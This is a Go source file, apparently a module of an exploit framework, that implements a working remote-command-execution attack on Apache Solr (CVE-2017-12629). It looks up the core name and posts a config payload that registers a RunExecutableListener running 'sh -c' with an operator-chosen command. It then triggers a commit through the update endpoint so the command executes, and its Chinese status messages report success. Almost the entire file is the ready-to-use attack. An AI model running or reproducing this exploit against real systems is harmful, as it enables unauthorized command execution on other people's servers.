package exp_Apache_Solr

import (
	"encoding/json"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
	"time"
)

type Exp_CVE_2017_12629 struct {
	exp_templates.ExpTemplate
}
type T4 struct {
	ResponseHeader struct {
		Status int `json:"status"`
		QTime  int `json:"QTime"`
	} `json:"responseHeader"`
	InitFailures struct {
	} `json:"initFailures"`
	Status struct {
		Demo struct {
			Name        string    `json:"name"`
			InstanceDir string    `json:"instanceDir"`
			DataDir     string    `json:"dataDir"`
			Config      string    `json:"config"`
			Schema      string    `json:"schema"`
			StartTime   time.Time `json:"startTime"`
			Uptime      int       `json:"uptime"`
		} `json:"demo"`
	} `json:"status"`
}

func (self *Exp_CVE_2017_12629) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 构造payload
	headers := self.GetInitExpHeaders()
	httpresp := self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/solr/admin/cores?indexInfo=false&wt=json"), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if strings.Contains(httpresp.Body, `responseHeader`) && strings.Contains(httpresp.Body, `name`) {
		T4 := T4{}
		jsonErr := json.Unmarshal([]byte(httpresp.Body), &T4)
		if jsonErr != nil {
			expResult.Err = jsonErr.Error()
			return
		}
		name := T4.Status.Demo.Name
		self.EchoInfoMsg("核心名：" + name)
		payload := "{\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newlistener\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\", \"cmd\"]}}"
		payload = strings.Replace(payload, "cmd", cmd, 1)
		headers.Set("Content-Type", "application/json")
		httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/solr/"+name+"/config"), payload, headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		if strings.Contains(httpresp.Body, `'newlistener' already exists`) {
			self.EchoInfoMsg("listener已存存在，正在更新！")
			payload = strings.Replace(payload, "add-listener", "update-listener", 1)
			payload = strings.Replace(payload, "cmd", cmd, 1)
			headers.Set("Content-Type", "application/json")
			httpresp = self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/solr/"+name+"/config"), payload, headers)
			if httpresp.Err != nil {
				expResult.Err = httpresp.Err.Error()
				return
			}
		} else {
			self.EchoInfoMsg("listener创建成功！")
		}
		if !strings.Contains(httpresp.Body, `errorMessages`) {
			self.EchoInfoMsg("listener更新成功！")
			payload = "[{\"id\":\"test\"}]"
			headers.Set("Content-Type", "application/json")
			httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/solr/"+name+"/update"), payload, headers)
			if httpresp.Err != nil {
				expResult.Err = httpresp.Err.Error()
				return
			}
			if !strings.Contains(httpresp.Body, `errorMessages`) {
				self.EchoInfoMsg("漏洞利用成功，无回显！")
				expResult.Status = true
			} else {
				self.EchoErrMsg("update失败！")
				return
			}
		} else {
			self.EchoErrMsg("listener更新失败！")
			return
		}
	}
	return
}

// func
func init() {

	exp_register.ExpStructRegister(&Exp_CVE_2017_12629{}, "exp_CVE_2017_12629.yml")
}
